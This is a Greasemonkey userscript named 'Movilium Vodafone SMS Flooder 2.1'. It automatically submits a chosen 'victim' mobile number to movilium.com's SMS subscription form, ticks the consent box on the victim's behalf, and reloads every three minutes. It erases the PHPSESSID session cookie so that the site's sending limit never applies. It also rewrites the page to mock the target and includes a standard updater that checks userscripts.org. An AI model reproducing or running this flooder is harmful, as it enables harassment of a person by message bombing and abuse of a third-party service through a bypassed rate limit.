// ==UserScript==
// @name           Movilium Vodafone SMS Flooder 2.1
// @namespace      Movilium Vodafone SMS Flooder 2.1
// @description    SMS Flooder
// @include        http://*movilium.com/*
// ==/UserScript==



//VARIABLES
var number = 666666666; //MOBILE NUMBER TO FLOOD
var refresh_time = 180000; //REFRESH TIME, MAYBE THE TAB/S STOP; DEFAULT TIME 3 MINUTES


//Replace text
document.title = "Movilium Vodafone SMS Flooder 2.1"
document.body.innerHTML=document.body.innerHTML.replace('Descarga', '******************************Sending unlimited SMS to '+number+' until his head explode******************************');
document.body.innerHTML=document.body.innerHTML.replace("en solo 3 pasos:",'');
document.body.innerHTML=document.body.innerHTML.replace("1. Introduce tu número de móvil:",'Victim mobile phone  >');
document.body.innerHTML=document.body.innerHTML.replace("2. Selecciona tu operador:",'Victim phone operator  >');
document.body.innerHTML=document.body.innerHTML.replace("Acepto las condiciones de servicio de suscripción y privacidad de datos.",'I agree with the victim SMS flood');


//Block shit
document.getElementsByClassName("txtrojo")[0].style.display = 'none';
document.getElementById("pie").style.display = "none";


//Fill&Send
var option = document.evaluate(".//select[@name = 'operator']/option[text() = 'vodafone']", document, null, XPathResult.ANY_UNORDERED_NODE_TYPE, null).singleNodeValue;if(option)void(option.selected = true);
document.getElementsByClassName("IntroNum")[0].value=number;
document.getElementsByClassName("check")[0].checked=true
document.getElementsByClassName("botonEnviar")[0].click();
setTimeout('window.location.reload()', refresh_time);


//Cookies
var Cookies = {
        // Initialize by splitting the array of Cookies
	init: function () {
		var allCookies = document.cookie.split('; ');
		for (var i=0;i<allCookies.length;i++) {
			var cookiePair = allCookies[i].split('=');
			this[cookiePair[0]] = cookiePair[1];
		}
	},
        // Create Function: Pass name of cookie, value, and days to expire
	create: function (name,value,days) {
		if (days) {
			var date = new Date();
			date.setTime(date.getTime()+(days*24*60*60*1000));
			var expires = "; expires="+date.toGMTString();
		}
		else var expires = "";
		document.cookie = name+"="+value+expires+"; path=/";
		this[name] = value;
	},
        // Erase cookie by name
	erase: function (name) {
		this.create(name,'',-1);
		this[name] = undefined;
	}
};
Cookies.init();



 
// Erase cookie "PHPSESSID" to send unlimited SMS
Cookies.erase('PHPSESSID');


//***UPDATER*** Credits: http://userscripts.org/scripts/review/20145
var SUC_script_num = 82780; // Change this to the number given to the script by userscripts.org (check the address bar)

try
{
	function updateCheck(forced)
	{
		if ((forced) || (parseInt(GM_getValue('SUC_last_update', '0')) + 86400000 <= (new Date().getTime()))) // Checks once a day (24 h * 60 m * 60 s * 1000 ms)
		{
			try
			{
				GM_xmlhttpRequest(
				{
					method: 'GET',
					url: 'http://userscripts.org/scripts/source/'+SUC_script_num+'.meta.js?'+new Date().getTime(),
					headers: {'Cache-Control': 'no-cache'},
					onload: function(resp)
					{
						var local_version, remote_version, rt, script_name;
						
						rt=resp.responseText;
						GM_setValue('SUC_last_update', new Date().getTime()+'');
						remote_version=parseInt(/@uso:version\s*(.*?)\s*$/m.exec(rt)[1]);
						local_version=parseInt(GM_getValue('SUC_current_version', '-1'));
						if(local_version!=-1)
						{
							script_name = (/@name\s*(.*?)\s*$/m.exec(rt))[1];
							GM_setValue('SUC_target_script_name', script_name);
							if (remote_version > local_version)
							{
								if(confirm('There is an update available for the Greasemonkey script "'+script_name+'."\nWould you like to go to the install page now?'))
								{
									GM_openInTab('http://userscripts.org/scripts/show/'+SUC_script_num);
									GM_setValue('SUC_current_version', remote_version);
								}
							}
							else if (forced)
								alert('No update is available for "'+script_name+'."');
						}
						else
							GM_setValue('SUC_current_version', remote_version+'');
					}
				});
			}
			catch (err)
			{
				if (forced)
					alert('An error occurred while checking for updates:\n'+err);
			}
		}
	}
	GM_registerMenuCommand(GM_getValue('SUC_target_script_name', '???') + ' - Manual Update Check', function()
	{
		updateCheck(true);
	});
	updateCheck(false);
}
catch(err)
{}